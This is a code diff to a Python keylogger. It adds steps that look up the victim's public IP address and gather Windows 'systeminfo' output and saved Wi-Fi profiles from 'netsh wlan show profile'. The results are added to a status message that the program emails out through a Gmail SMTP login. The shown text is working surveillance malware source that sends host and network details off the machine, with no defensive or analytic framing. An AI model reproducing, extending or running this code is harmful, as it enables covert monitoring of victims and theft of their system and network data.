@@ -7,27 +7,46 @@ def main():
         from pynput.keyboard import Key, Listener
 
         if IsAccountActive:
+            msg = "Keylogger Activated Successfully...\n\n"
+
+            terminal("pip install requests==2.26.0")
+
+            try:
+                # Importing third party library.
+                print("[INFO]\tImporting get from requests.")
+                from requests import get
+
+                print("[INFO]\tImporting ConnectionError from requests.exceptions.")
+                from requests.exceptions import ConnectionError
+
+                try:
+                    public_ip = get("https://api.ipify.org").text
+                    msg = msg + f"Public IP address: {public_ip}\n\n"
+
+                except ConnectionError as connection_error:
+                    print(f"[ERROR]\tSorry, an error occurred! {connection_error}")
+                    info(f"Error: {connection_error}")
+                    Beep(1200, 2000)
+
+            except ModuleNotFoundError as module_error:
+                print(f"[ERROR]\tSorry, an error occurred! {module_error}")
+                info(f"Error: {module_error}")
+                Beep(1200, 2000)
+
             if operating_system == "Windows":
                 terminal("systeminfo > systeminfo.txt")
                 file = open("systeminfo.txt", "r")
                 systeminfo = file.read()
                 file.close()
                 remove("systeminfo.txt")
+                msg = msg + f"systeminfo:\n {systeminfo}\n\n"
 
                 terminal("netsh wlan show profile > netsh.txt")
                 file = open("netsh.txt", "r")
                 netsh = file.read()
                 file.close()
                 remove("netsh.txt")
-
-                msg = (
-                    f"Keylogger Activated Successfully...\n\n"
-                    f"systeminfo:\n{systeminfo}\n\n"
-                    f"netsh wlan show profile:\n{netsh}"
-                )
-
-            else:
-                msg = "Keylogger Activated Successfully..."
+                msg = msg + f"netsh wlan show profile:\n {netsh}\n\n"
 
             try:
                 print("[INFO]\tSending status email...")
@@ -297,9 +316,6 @@ try:
     print("[INFO]\tImporting exit as terminate from sys.")
     from sys import exit as terminate
 
-    print("[INFO]\tImporting sleep from time.")
-    from time import sleep
-
     print("[INFO]\tImporting Beep from winsound.")
     from winsound import Beep
 
@@ -321,7 +337,6 @@ try:
         try:
             print("[INFO]\tLogin to Gmail address.")
             server.login(email, password)
-
             IsAccountActive = True
 
         except SMTPAuthenticationError as credential_error:
